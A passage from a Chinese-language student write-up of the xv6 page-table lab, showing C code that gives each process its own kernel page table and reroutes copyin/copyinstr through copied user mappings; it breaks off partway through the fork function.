<span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">pagetable_t</span> kpgtable;        <span class="hljs-comment">// Kernel page table</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>后面要用的几个重要函数</p><table><thead><tr><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>walk</td><td>通过虚拟地址得到 PTE</td></tr><tr><td>mappages</td><td>将虚拟地址映射到物理地址</td></tr><tr><td>copyin</td><td>将用户虚拟地址的数据复制到内核空间地址</td></tr><tr><td>copyout</td><td>将内核数据复制到用户虚拟地址</td></tr><tr><td>kvminit</td><td>创建内核的页表，对全局的<code>kernel_pagetable</code>进行映射</td></tr><tr><td>kvmmap</td><td>调用 mappages，将一个虚拟地址范围映射到一个物理地址范围</td></tr><tr><td>kvminithart</td><td>映射内核页表。它将根页表页的物理地址写入寄存器 satp 中</td></tr><tr><td>procinit</td><td>为每个进程分配一个内核栈</td></tr><tr><td>kalloc</td><td>分配物理页</td></tr><tr><td>proc_pagetable(struct proc *<em>p</em>)</td><td>为给定的进程创建用户态页表</td></tr><tr><td>kvminithart</td><td>映射内核页表。它将根页表页的物理地址写入寄存器 satp 中</td></tr></tbody></table><p>相关函数调用链：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">main <br><span class="hljs-function"><span class="hljs-title">kvminit</span> -&gt;</span> kvmmap<br>procinit<br><span class="hljs-function"><span class="hljs-title">userinit</span> -&gt;</span> allocproc<br></code></pre></td></tr></table></figure><p>之后，我们要对进程的内核页表进行初始化</p><p>参考kvminit函数和kvmmap函数，这两个函数用来添加对全局kernel_pagetable的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * create a direct-map page table for the kernel.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  kernel_pagetable = (<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kernel_pagetable, <span class="hljs-number">0</span>, PGSIZE);<br><br>  <span class="hljs-comment">// uart registers</span><br>  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// virtio mmio disk interface</span><br>  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// CLINT</span><br>  kvmmap(CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// PLIC</span><br>  kvmmap(PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map kernel text executable and read-only.</span><br>  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br><br>  <span class="hljs-comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span><br>  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map the trampoline for trap entry/exit to</span><br>  <span class="hljs-comment">// the highest virtual address in the kernel.</span><br>  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>&#125;<br><br><span class="hljs-comment">// add a mapping to the kernel page table.</span><br><span class="hljs-comment">// only used when booting.</span><br><span class="hljs-comment">// does not flush TLB or enable paging.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvmmap</span><span class="hljs-params">(uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;kvmmap&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>类似的，我们创建ukvmmap和ukvminit这两个函数，完成对进程结构体中的内核页表的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> kpgtable,uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kpgtable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;ukvmmap&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span></span><br><span class="hljs-function"><span class="hljs-title">ukvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pagetable_t</span> kpgtable=(<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kpgtable, <span class="hljs-number">0</span>, PGSIZE);<br>  ukvmmap(kpgtable, UART0, UART0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br>  ukvmmap(kpgtable, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>  <span class="hljs-keyword">return</span> kpgtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>在defs.h中需要添加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,uint64 , uint64 , uint64 , <span class="hljs-keyword">int</span> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span>     <span class="hljs-title">ukvminit</span><span class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure><p>根据前面函数调用的分析，我们可以发现这个main中userinit -&gt; allocproc的调用。allocproc函数返回一个未被利用的进程，并且做初始化工作，比如下面的这一些代码来自allocproc，做了用户页表的初始化工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// An empty user page table.</span><br>p-&gt;pagetable = proc_pagetable(p);<br><span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样的，既然已经在结构体里面加了kpgtable，那么也要给进程的内核态页表做初始化工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在procinit函数中，为了给进程初始化内核栈，有这样一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Allocate a page for the process&#x27;s kernel stack.</span><br><span class="hljs-comment">// Map it high in memory, followed by an invalid</span><br><span class="hljs-comment">// guard page.</span><br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>类似的，在allocproc函数中，我们需要初始化内核栈并将其映射到进程单独的内核页表，需要加上：（在这之后可以将procinit中初始化内核栈的代码注释掉）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>ukvmmap(p-&gt;kpgtable, va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>freeproc函数，要将进程的内核页表进行清除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <span class="hljs-comment">/* add here */</span><br>  <span class="hljs-keyword">if</span> (p-&gt;kstack)<br>  &#123;<br>      <span class="hljs-keyword">pte_t</span>* pte = walk(p-&gt;kpgtable, p-&gt;kstack, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (pte == <span class="hljs-number">0</span>)<br>          panic(<span class="hljs-string">&quot;freeproc: walk&quot;</span>);<br>      kfree((<span class="hljs-keyword">void</span>*)PTE2PA(*pte));<br>  &#125;<br>  p-&gt;kstack = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (p-&gt;kpgtable)<br>    freewalk_kproc(p-&gt;kpgtable);<br>  <span class="hljs-comment">/* add here */</span><br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要模仿freewalk重新实现freewalk_kproc，使得仅仅解除页表的内存映射而不像freewalk一样清除物理页数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freewalk_kproc</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<br>      pagetable[i] = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        freewalk_kproc((<span class="hljs-keyword">pagetable_t</span>)child);<br>      &#125;<br>    &#125;<br>  &#125;<br>  kfree((<span class="hljs-keyword">void</span>*)pagetable);<br>&#125;<br></code></pre></td></tr></table></figure><p> 在调度程序scheduler中，调度程序之前，我们需要切换到进程自己的内核页表处，并使用sfence.vma刷新当前 CPU 的 TLB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-CPU process scheduler.</span><br><span class="hljs-comment">// Each CPU calls scheduler() after setting itself up.</span><br><span class="hljs-comment">// Scheduler never returns.  It loops, doing:</span><br><span class="hljs-comment">//  - choose a process to run.</span><br><span class="hljs-comment">//  - swtch to start running that process.</span><br><span class="hljs-comment">//  - eventually that process transfers control</span><br><span class="hljs-comment">//    via swtch back to the scheduler.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">scheduler</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">c</span> =</span> mycpu();<br>  <br>  c-&gt;proc = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">// Avoid deadlock by ensuring that devices can interrupt.</span><br>    intr_on();<br>    <br>    <span class="hljs-keyword">int</span> found = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>      acquire(&amp;p-&gt;lock);<br>      <span class="hljs-keyword">if</span>(p-&gt;state == RUNNABLE) &#123;<br>        <span class="hljs-comment">// Switch to chosen process.  It is the process&#x27;s job</span><br>        <span class="hljs-comment">// to release its lock and then reacquire it</span><br>        <span class="hljs-comment">// before jumping back to us.</span><br>        p-&gt;state = RUNNING;<br>        c-&gt;proc = p;<br>        <span class="hljs-comment">//切换到进程自己的内核页表处</span><br>        w_satp(MAKE_SATP(p-&gt;kpgtable));<br>        <span class="hljs-comment">//使用sfence.vma刷新当前 CPU 的 TLB</span><br>        sfence_vma();<br>        <span class="hljs-comment">//调度进程</span><br>        swtch(&amp;c-&gt;context, &amp;p-&gt;context);<br>        <span class="hljs-comment">//切换回内核页表</span><br>        kvminithart();<br>        <br>        <span class="hljs-comment">// Process is done running for now.</span><br>        <span class="hljs-comment">// It should have changed its p-&gt;state before coming back.</span><br>        c-&gt;proc = <span class="hljs-number">0</span>;<br><br>        found = <span class="hljs-number">1</span>;<br>      &#125;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> !defined (LAB_FS)</span><br>    <span class="hljs-keyword">if</span>(found == <span class="hljs-number">0</span>) &#123;<br>      intr_on();<br>      <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;wfi&quot;</span>)</span></span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    ;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>给 vm.c 添加头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;spinlock.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;proc.h&quot;</span><span class="hljs-comment">//如果顺序颠倒会报结构体定义错误</span></span><br></code></pre></td></tr></table></figure><p>修改 <code>kvmpa</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pte = walk(myproc()-&gt;kpgtable, va, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin/copyinstr</code></h2><blockquote><p>内核的 copyin 函数读取用户指针指向的内存。它通过将它们转换为物理地址来实现这一点，而内核可以直接取消对它们的引用。它通过在软件中遍历过程页表来执行这种转换。在实验室的这一部分中，您的工作是向每个进程的内核页表(在前一节中创建)添加用户映射，以允许 copyin (以及相关的字符串函数 copinstr)直接取消引用用户指针。</p></blockquote><p>首先声明copyin_new和copyinstr_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyin_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyinstr_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span>;<br></code></pre></td></tr></table></figure><p>修改copyin函数，使得改为执行copyin_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyin</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyin_new(pagetable, dst, srcva, len);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyinstr</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyinstr_new(pagetable, dst, srcva, max);<br>&#125;<br></code></pre></td></tr></table></figure><p>增加一个u2kvmcopy函数，完成页表的复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">u2kvmcopy</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> upagetable, <span class="hljs-keyword">pagetable_t</span> kpagetable, uint64 oldsz, uint64 newsz)</span></span><br><span class="hljs-function"></span>&#123;<br>  oldsz = PGROUNDUP(oldsz);<br>  <span class="hljs-keyword">for</span> (uint64 i = oldsz; i &lt; newsz; i += PGSIZE) &#123;<br>    <span class="hljs-keyword">pte_t</span>* pte_from = walk(upagetable, i, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(pte_from == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_from&quot;</span>);<br>    <span class="hljs-keyword">pte_t</span>* pte_to = walk(kpagetable, i, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(pte_to == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_to&quot;</span>);<br>    uint64 pa = PTE2PA(*pte_from);<br>    uint flag = (PTE_FLAGS(*pte_from)) &amp; (~PTE_U);<br>    *pte_to = PA2PTE(pa) | flag;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>userinit加上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><p>fork加上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  